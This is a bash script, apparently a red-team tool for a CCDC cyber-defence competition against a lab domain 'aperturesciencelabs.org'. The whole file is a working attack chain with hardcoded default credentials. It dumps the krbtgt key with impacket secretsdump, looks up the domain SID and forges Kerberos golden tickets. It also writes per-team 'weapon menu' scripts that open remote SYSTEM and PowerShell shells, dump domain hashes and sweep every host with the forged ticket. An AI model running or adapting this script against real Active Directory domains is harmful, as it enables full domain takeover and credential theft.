#!/bin/bash
# ================================================
# CCDC Golden Ticket Forge Script (2026)
# Fully impacket-based, no Windows tools, no logs
# Default creds: chell:Th3cake1salie!
# Domain: aperturesciencelabs.org
# DC: 192.168.20<TEAM>.140 (external) / 172.16.3.140 (internal -x)
# Supports "all" → forges teams 1-5 instantly
# Creates:
#   teamN.ccache               — Kerberos ticket cache (identity: chell)
#   team<N>_use.sh              — self-contained use-script per team
# ================================================

usage() {
  echo "Usage: $0 [-z] [-x] <team_number | all> [user:password]"
  echo "   e.g. $0 5"
  echo "   e.g. $0 all              # teams 1-5 with default creds"
  echo "   e.g. $0 5 bob:password   # override creds"
  echo "   e.g. $0 all bob:password"
  echo "   e.g. $0 -z 5             # use zero.sh dump (offline forge)"
  echo "   e.g. $0 -z all"
  echo "   e.g. $0 -x 5             # use internal 172.16.x.x IPs"
  exit 1
}

# Parse flags
USE_ZERO=0
USE_INTERNAL=0
while [[ "$1" == -* ]]; do
  case "$1" in
    -z) USE_ZERO=1; shift ;;
    -x) USE_INTERNAL=1; shift ;;
    *)  echo "[-] Unknown flag: $1"; usage ;;
  esac
done

if [[ $# -lt 1 || $# -gt 2 ]]; then
  usage
fi

ARG="$1"
DOMAIN="aperturesciencelabs.org"
USER="chell"
PASS="Th3cake1salie!"

# All known domain admin accounts — tried in order if primary creds fail
DA_USERS=(chell Administrator caroline cave glados wheatley)

# Override creds if provided as user:password
if [[ $# -eq 2 ]]; then
  if [[ "$2" != *:* ]]; then
    echo "[-] Credentials must be in user:password format"
    usage
  fi
  USER="${2%%:*}"
  PASS="${2#*:}"
  echo "[*] Using provided creds: ${USER}:*****"
fi

# ============== FIND IMPACKET COMMANDS ==============
get_cmd() {
  local base="$1"
  for prefix in "" "impacket-"; do
    for ext in "" ".py"; do
      local cmd="${prefix}${base}${ext}"
      if command -v "$cmd" >/dev/null 2>&1; then
        echo "$cmd"; return 0
      fi
    done
  done
  echo ""
}

SECRETS_CMD=$(get_cmd secretsdump)
LOOKUPSID_CMD=$(get_cmd lookupsid)
TICKETER_CMD=$(get_cmd ticketer)

if [[ -z "$SECRETS_CMD" || -z "$LOOKUPSID_CMD" || -z "$TICKETER_CMD" ]]; then
  echo "[-] ERROR: Missing impacket tools (secretsdump / lookupsid / ticketer)"
  echo "    Install: sudo apt install impacket-scripts"
  exit 1
fi

# ============== GENERATE PER-TEAM USE SCRIPT ==============
# Writes a standalone team<N>_use.sh that re-forges + uses the ticket
gen_use_script() {
  local TEAM="$1"
  local DC="$2"
  local CCACHE="team${TEAM}.ccache"
  local SCRIPT="team${TEAM}_use.sh"

  # Determine IP set for the generated script
  local IP_CURIOSITY="$DC"
  local IP_MORALITY IP_INTEL IP_ANGER IP_FACT IP_SPACE IP_ADVENTURE
  if [[ $USE_INTERNAL -eq 1 ]]; then
    IP_MORALITY="172.16.1.10"
    IP_INTEL="172.16.1.11"
    IP_ANGER="172.16.2.70"
    IP_FACT="172.16.2.71"
    IP_SPACE="172.16.3.141"
    IP_ADVENTURE="172.16.2.72"
  else
    IP_MORALITY="192.168.20${TEAM}.10"
    IP_INTEL="192.168.20${TEAM}.11"
    IP_ANGER="192.168.20${TEAM}.70"
    IP_FACT="192.168.20${TEAM}.71"
    IP_SPACE="192.168.20${TEAM}.141"
    IP_ADVENTURE="192.168.20${TEAM}.72"
  fi

  cat > "$SCRIPT" <<'SCRIPT_EOF'
#!/bin/bash
SCRIPT_EOF

  cat >> "$SCRIPT" <<SCRIPT_EOF
# ================================================
# Team ${TEAM} Golden Ticket — Weapon Selector
# DC: ${DC} (curiosity.${DOMAIN})
# ================================================

DOMAIN="${DOMAIN}"
DC_IP="${DC}"
TEAM="${TEAM}"
DC_FQDN="curiosity.\${DOMAIN}"
SCRIPT_DIR="\$(cd "\$(dirname "\$0")" && pwd)"
CCACHE="\${SCRIPT_DIR}/${CCACHE}"
GOLDUSER="chell"

# All hosts: FQDN → IP
declare -A HOST_IP=(
  ["curiosity.\${DOMAIN}"]="${IP_CURIOSITY}"
  ["morality.\${DOMAIN}"]="${IP_MORALITY}"
  ["intelligence.\${DOMAIN}"]="${IP_INTEL}"
  ["anger.\${DOMAIN}"]="${IP_ANGER}"
  ["fact.\${DOMAIN}"]="${IP_FACT}"
  ["space.\${DOMAIN}"]="${IP_SPACE}"
  ["adventure.\${DOMAIN}"]="${IP_ADVENTURE}"
)
# Ordered list for the menu
HOST_ORDER=(
  "curiosity.\${DOMAIN}"
  "morality.\${DOMAIN}"
  "intelligence.\${DOMAIN}"
  "anger.\${DOMAIN}"
  "fact.\${DOMAIN}"
  "space.\${DOMAIN}"
  "adventure.\${DOMAIN}"
)
HOST_DESC=(
  ".140 — DC (curiosity)"
  ".10  — morality"
  ".11  — intelligence"
  ".70  — anger"
  ".71  — fact"
  ".141 — space"
  ".72  — adventure"
)

# --- locate impacket tools ---
get_cmd() {
  local base="\$1"
  for prefix in "" "impacket-"; do
    for ext in "" ".py"; do
      local c="\${prefix}\${base}\${ext}"
      command -v "\$c" >/dev/null 2>&1 && { echo "\$c"; return 0; }
    done
  done
  echo ""
}

# ============== CHECK TICKET ==============
if [[ ! -f "\$CCACHE" ]]; then
  echo "[-] Ticket not found: \$CCACHE"
  echo "    Run: ./forgegold.sh ${TEAM}  to forge it first."
  exit 1
fi

# ============== FIX KERBEROS / DNS ==============
# Patches /etc/hosts and krb5.conf so Kerberos works over VPN
# (no AD DNS available). Safe to run on LAN too — idempotent.
patch_kerberos() {
  local needs_hosts=0
  for fqdn in "\${HOST_ORDER[@]}"; do
    if ! grep -q "\$fqdn" /etc/hosts 2>/dev/null; then
      needs_hosts=1; break
    fi
  done

  if [[ \$needs_hosts -eq 1 ]]; then
    echo "[*] Patching /etc/hosts (needs sudo — fixes Kerberos over VPN)"
    if sudo -n true 2>/dev/null || sudo true 2>/dev/null; then
      for fqdn in "\${HOST_ORDER[@]}"; do
        local ip="\${HOST_IP[\$fqdn]}"
        grep -q "\$fqdn" /etc/hosts 2>/dev/null || echo "\$ip    \$fqdn" | sudo tee -a /etc/hosts >/dev/null
      done
      grep -q "\${DOMAIN}" /etc/hosts 2>/dev/null || echo "${DC}    \${DOMAIN}" | sudo tee -a /etc/hosts >/dev/null
      echo "[+] /etc/hosts updated"
    else
      echo "[!] sudo unavailable — skipping /etc/hosts patch (may still work on LAN)"
    fi
  fi

  local KRB5_CONF="/etc/krb5.conf"
  local REALM="\$(echo \${DOMAIN} | tr '[:lower:]' '[:upper:]')"
  if ! grep -q "\${REALM}" "\${KRB5_CONF}" 2>/dev/null; then
    echo "[*] Patching krb5.conf with realm \${REALM}"
    if sudo -n true 2>/dev/null || sudo true 2>/dev/null; then
      sudo bash -c "cat >> \${KRB5_CONF}" <<KRB_EOF

[libdefaults]
    default_realm = \${REALM}
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    \${REALM} = {
        kdc = \$DC_FQDN
        admin_server = \$DC_FQDN
    }

[domain_realm]
    .\${DOMAIN} = \${REALM}
    \${DOMAIN} = \${REALM}
KRB_EOF
      echo "[+] krb5.conf updated"
    else
      echo "[!] sudo unavailable — skipping krb5.conf patch (may still work on LAN)"
    fi
  fi
}

patch_kerberos

# ============== EXPORT TICKET ==============
export KRB5CCNAME="\$CCACHE"
echo "[+] Ticket loaded  → \$KRB5CCNAME"
echo "[+] Identity       → \$GOLDUSER @ \$DOMAIN"
echo ""

# ============== HOST PICKER SUBMENU ==============
# Returns selected FQDN in SELECTED_FQDN and IP in SELECTED_IP
# default_idx: 0-based index into HOST_ORDER (0 = DC)
pick_host() {
  local default_idx="\${1:-0}"
  echo ""
  echo "  --- Select Target Host ---"
  for i in "\${!HOST_ORDER[@]}"; do
    local fqdn="\${HOST_ORDER[\$i]}"
    local ip="\${HOST_IP[\$fqdn]}"
    local desc="\${HOST_DESC[\$i]}"
    local marker=""
    [[ \$i -eq \$default_idx ]] && marker=" (default)"
    echo "    \$((i+1))) \$desc  [\$ip]\${marker}"
  done
  echo ""
  read -rp "  Host [1-\${#HOST_ORDER[@]}, Enter=default]: " HOST_CHOICE
  if [[ -z "\$HOST_CHOICE" ]]; then
    HOST_CHOICE=\$((default_idx+1))
  fi
  if ! [[ "\$HOST_CHOICE" =~ ^[0-9]+\$ ]] || (( HOST_CHOICE < 1 || HOST_CHOICE > \${#HOST_ORDER[@]} )); then
    echo "[-] Invalid — using default"
    HOST_CHOICE=\$((default_idx+1))
  fi
  SELECTED_FQDN="\${HOST_ORDER[\$((HOST_CHOICE-1))]}"
  SELECTED_IP="\${HOST_IP[\$SELECTED_FQDN]}"
  echo "  [*] Target → \$SELECTED_FQDN (\$SELECTED_IP)"
  echo ""
}

# ============== PRINT COMMANDS ==============
print_commands() {
  local SMBEXEC_CMD="\$(get_cmd smbexec)"
  local PSEXEC_CMD="\$(get_cmd psexec)"
  local WMIEXEC_CMD="\$(get_cmd wmiexec)"
  local SECRETS_CMD="\$(get_cmd secretsdump)"
  echo ""
  echo "=========================================================="
  echo "  COMMAND TEMPLATES — Team \${TEAM}"
  echo "  Hostnames:  curiosity(.140) morality(.10) intelligence(.11)"
  echo "              anger(.70)     fact(.71)     space(.141) adventure(.72)"
  echo "=========================================================="
  echo ""
  echo "--- LOAD TICKET (run this in your shell) ---"
  echo ""
  echo "  export KRB5CCNAME=\$CCACHE"
  echo ""
  echo "--- SHELLS ---"
  echo ""
  echo "  \$SMBEXEC_CMD \$DOMAIN/\$GOLDUSER@<HOST>.\$DOMAIN -k -no-pass -dc-ip \$DC_IP"
  echo "  \$PSEXEC_CMD  \$DOMAIN/\$GOLDUSER@<HOST>.\$DOMAIN -k -no-pass -dc-ip \$DC_IP"
  echo "  \$WMIEXEC_CMD \$DOMAIN/\$GOLDUSER@<HOST>.\$DOMAIN -k -no-pass -dc-ip \$DC_IP"
  echo "  evil-winrm -i <HOST>.\$DOMAIN -r \$DOMAIN"
  echo ""
  echo "--- DUMP HASHES ---"
  echo ""
  echo "  \$SECRETS_CMD \$DOMAIN/\$GOLDUSER@\$DC_FQDN -k -no-pass -dc-ip \$DC_IP"
  echo "  \$SECRETS_CMD \$DOMAIN/\$GOLDUSER@\$DC_FQDN -k -no-pass -dc-ip \$DC_IP -just-dc-user Administrator"
  echo ""
  echo "--- NETEXEC (all hosts) ---"
  echo ""
  echo "  netexec smb  ${IP_CURIOSITY} ${IP_MORALITY} ${IP_INTEL} ${IP_ANGER} ${IP_FACT} ${IP_SPACE} ${IP_ADVENTURE} -u \$GOLDUSER --use-kcache --continue-on-success"
  echo "  netexec winrm ${IP_CURIOSITY} ${IP_MORALITY} ${IP_INTEL} ${IP_ANGER} ${IP_FACT} ${IP_SPACE} ${IP_ADVENTURE} -u \$GOLDUSER --use-kcache --continue-on-success"
  echo ""
  echo "--- RDP ---"
  echo ""
  echo "  xfreerdp /v:\$DC_IP /d:\$DOMAIN /u:\$GOLDUSER /cert-ignore"
  echo ""
  echo "=========================================================="
}

# ============== WEAPON MENU ==============
SELECTED_FQDN="\$DC_FQDN"
SELECTED_IP="\$DC_IP"

while true; do
  echo "=========================================================="
  echo "  Team \${TEAM} — Choose Your Weapon"
  echo "  Current target: \$SELECTED_FQDN (\$SELECTED_IP)"
  echo "=========================================================="
  echo "  1) smbexec       (SMB shell → target)"
  echo "  2) psexec        (SYSTEM shell → target)"
  echo "  3) wmiexec       (WMI shell → target)"
  echo "  4) evil-winrm    (PowerShell → target)"
  echo "  5) secretsdump   (dump domain hashes → DC)"
  echo "  6) netexec SMB   (auth sweep all hosts)"
  echo "  7) netexec WinRM (auth sweep all hosts)"
  echo "  8) xfreerdp      (RDP → target)"
  echo "  t) Change target host"
  echo "  p) Print all copy-paste commands"
  echo "  9) bash shell    (ticket pre-exported)"
  echo "  0) Exit"
  echo ""
  read -rp "Choice: " CHOICE

  case "\$CHOICE" in
    1)
      pick_host 0
      \$(get_cmd smbexec) "\$DOMAIN/\$GOLDUSER@\$SELECTED_FQDN" -k -no-pass -dc-ip "\$DC_IP" ;;
    2)
      pick_host 0
      \$(get_cmd psexec) "\$DOMAIN/\$GOLDUSER@\$SELECTED_FQDN" -k -no-pass -dc-ip "\$DC_IP" ;;
    3)
      pick_host 0
      \$(get_cmd wmiexec) "\$DOMAIN/\$GOLDUSER@\$SELECTED_FQDN" -k -no-pass -dc-ip "\$DC_IP" ;;
    4)
      pick_host 0
      if command -v evil-winrm >/dev/null 2>&1; then
        evil-winrm -i "\$SELECTED_FQDN" -r "\$DOMAIN"
      else
        echo "[-] evil-winrm not found"
      fi ;;
    5)
      \$(get_cmd secretsdump) "\$DOMAIN/\$GOLDUSER@\$DC_FQDN" -k -no-pass -dc-ip "\$DC_IP" ;;
    6)
      netexec smb ${IP_CURIOSITY} ${IP_MORALITY} ${IP_INTEL} ${IP_ANGER} ${IP_FACT} ${IP_SPACE} ${IP_ADVENTURE} -u "\$GOLDUSER" --use-kcache --continue-on-success ;;
    7)
      netexec winrm ${IP_CURIOSITY} ${IP_MORALITY} ${IP_INTEL} ${IP_ANGER} ${IP_FACT} ${IP_SPACE} ${IP_ADVENTURE} -u "\$GOLDUSER" --use-kcache --continue-on-success ;;
    8)
      pick_host 0
      if command -v xfreerdp >/dev/null 2>&1; then
        xfreerdp /v:"\$SELECTED_IP" /d:"\$DOMAIN" /u:"\$GOLDUSER" /cert-ignore
      else
        echo "[-] xfreerdp not found"
      fi ;;
    t|T)
      pick_host 0
      ;;
    p|P) print_commands; break ;;
    9)
      echo "[*] Dropping into bash with KRB5CCNAME exported. Type 'exit' to return."
      bash ;;
    0) echo "[*] Exiting."; break ;;
    *) echo "[-] Invalid choice" ;;
  esac
  echo ""
done
SCRIPT_EOF

  chmod +x "$SCRIPT"
  echo "[+] Generated → ${SCRIPT}"
}

# ============== FORGE FUNCTION ==============
forge_team() {
  local TEAM="$1"
  local DC
  if [[ $USE_INTERNAL -eq 1 ]]; then
    DC="172.16.3.140"
  else
    DC="192.168.20${TEAM}.140"
  fi
  local CCACHE="team${TEAM}.ccache"

  echo "[*] ================================================"
  echo "[*] Forging Golden Ticket — TEAM ${TEAM} — ${DC}"
  echo "[*] ================================================"

  local AES_KEY=""
  local KRBTGT_HASH=""
  local DOMAIN_SID=""

  if [[ $USE_ZERO -eq 1 ]]; then
    # -z mode: parse the most recent zero.sh dump for this team
    local DUMP_FILE
    DUMP_FILE=$(ls -t team${TEAM}_*.txt 2>/dev/null | head -n1)
    if [[ -z "$DUMP_FILE" || ! -f "$DUMP_FILE" ]]; then
      echo "[-] No zero.sh dump found for team ${TEAM} (expected team${TEAM}_*.txt)"
      return 1
    fi
    echo "[*] Using zero.sh dump: ${DUMP_FILE}"

    # Extract krbtgt AES-256 key (preferred)
    AES_KEY=$(grep -m1 'krbtgt:aes256-cts-hmac-sha1-96:' "$DUMP_FILE" | awk -F: '{print $NF}')
    # Fallback: NTLM hash
    KRBTGT_HASH=$(awk -F: '/krbtgt:[0-9]+:/ {print $4}' "$DUMP_FILE" | head -n1)

    if [[ -z "$AES_KEY" && -z "$KRBTGT_HASH" ]]; then
      echo "[-] Could not extract krbtgt key from ${DUMP_FILE}"
      return 1
    fi
    [[ -n "$AES_KEY" ]] && echo "[+] krbtgt AES-256 key extracted from dump" \
                        || echo "[+] krbtgt NTLM hash extracted from dump (AES not found)"

    # Get Domain SID — use Administrator hash from dump for lookupsid
    local ADMIN_HASH
    ADMIN_HASH=$(awk -F: '/Administrator:500:/ {print $4}' "$DUMP_FILE" | head -n1)
    if [[ -n "$ADMIN_HASH" ]]; then
      echo "[*] Using Administrator hash from dump for SID lookup..."
      "$LOOKUPSID_CMD" "${DOMAIN}/Administrator@${DC}" \
        -hashes "aad3b435b51404eeaad3b435b51404ee:${ADMIN_HASH}" > /tmp/_sid_${TEAM}.txt 2>&1
      DOMAIN_SID=$(grep -oE 'S-1-5-21-[0-9-]+' /tmp/_sid_${TEAM}.txt | head -n1)
      rm -f /tmp/_sid_${TEAM}.txt
    fi

    if [[ -z "$DOMAIN_SID" ]]; then
      echo "[-] Could not retrieve Domain SID for team ${TEAM}"
      echo "    Tip: forge manually with:"
      echo "    ticketer -aesKey <key> -domain ${DOMAIN} -domain-sid <SID> chell"
      return 1
    fi
    echo "[+] Domain SID: ${DOMAIN_SID}"

  else
    # Live mode: dump krbtgt via secretsdump — try each DA account
    local WORKING_USER=""
    local TRY_USERS=("$USER")
    for da in "${DA_USERS[@]}"; do
      [[ "$da" == "$USER" ]] && continue
      TRY_USERS+=("$da")
    done

    for try_user in "${TRY_USERS[@]}"; do
      echo "[*] Trying ${try_user}:***..."
      "$SECRETS_CMD" "${DOMAIN}/${try_user}:${PASS}@${DC}" \
        -just-dc-user krbtgt -dc-ip "${DC}" > /tmp/_krb_${TEAM}.txt 2>&1
      # Extract AES-256 key (preferred for modern DCs with RC4 disabled)
      AES_KEY=$(grep -m1 'aes256-cts-hmac-sha1-96:' /tmp/_krb_${TEAM}.txt | awk -F: '{print $NF}')
      # Fallback: NTLM hash
      KRBTGT_HASH=$(awk -F: '/^krbtgt:/ {print $4}' /tmp/_krb_${TEAM}.txt)
      rm -f /tmp/_krb_${TEAM}.txt
      if [[ -n "$AES_KEY" || ( -n "$KRBTGT_HASH" && ${#KRBTGT_HASH} -eq 32 ) ]]; then
        WORKING_USER="$try_user"
        [[ -n "$AES_KEY" ]] \
          && echo "[+] krbtgt AES-256 key acquired (via ${WORKING_USER})" \
          || echo "[+] krbtgt NTLM hash acquired (via ${WORKING_USER})"
        break
      fi
    done

    if [[ -z "$AES_KEY" && -z "$KRBTGT_HASH" ]]; then
      echo "[-] Could not extract krbtgt key for team ${TEAM} — all DA accounts failed"
      return 1
    fi

    # Get Domain SID
    "$LOOKUPSID_CMD" "${DOMAIN}/${WORKING_USER}:${PASS}@${DC}" > /tmp/_sid_${TEAM}.txt 2>&1
    DOMAIN_SID=$(grep -oE 'S-1-5-21-[0-9-]+' /tmp/_sid_${TEAM}.txt | head -n1)
    rm -f /tmp/_sid_${TEAM}.txt

    if [[ -z "$DOMAIN_SID" ]]; then
      echo "[-] Could not retrieve Domain SID for team ${TEAM}"
      return 1
    fi
    echo "[+] Domain SID: ${DOMAIN_SID}"
  fi

  # Forge ticket as chell (real DA — PAC-valid)
  # Prefer AES-256 key (works on modern DCs with RC4 disabled), fall back to NTLM
  if [[ -n "$AES_KEY" ]]; then
    echo "[*] Forging with AES-256 key..."
    "$TICKETER_CMD" \
      -aesKey "${AES_KEY}" \
      -domain "${DOMAIN}" \
      -domain-sid "${DOMAIN_SID}" \
      "chell" >/dev/null 2>&1
  else
    echo "[!] AES key not available — falling back to NTLM (RC4)"
    "$TICKETER_CMD" \
      -nthash "${KRBTGT_HASH}" \
      -domain "${DOMAIN}" \
      -domain-sid "${DOMAIN_SID}" \
      "chell" >/dev/null 2>&1
  fi
  [[ -f "chell.ccache" ]] && mv "chell.ccache" "${CCACHE}"

  if [[ ! -f "${CCACHE}" ]]; then
    echo "[-] Ticket file not created for team ${TEAM}"
    return 1
  fi

  echo "[+] Ticket forged → ${CCACHE}"

  # Write auto-use script
  gen_use_script "${TEAM}" "${DC}"

  echo "[+] TEAM ${TEAM} complete."
  echo ""
}

# ============== MAIN ==============
if [[ "$ARG" == "all" || "$ARG" == "All" ]]; then
  echo "[*] Forging golden tickets for ALL teams (1-5)..."
  echo ""
  for t in {1..5}; do
    forge_team "$t"
  done
  echo "[*] All teams done."
  echo "[*] Run ./teamN_use.sh to load a ticket and get a shell."
else
  if ! [[ "$ARG" =~ ^[0-9]+$ ]]; then
    usage
  fi
  forge_team "$ARG"
  echo "[*] Run ./team${ARG}_use.sh to load the ticket and attack."
fi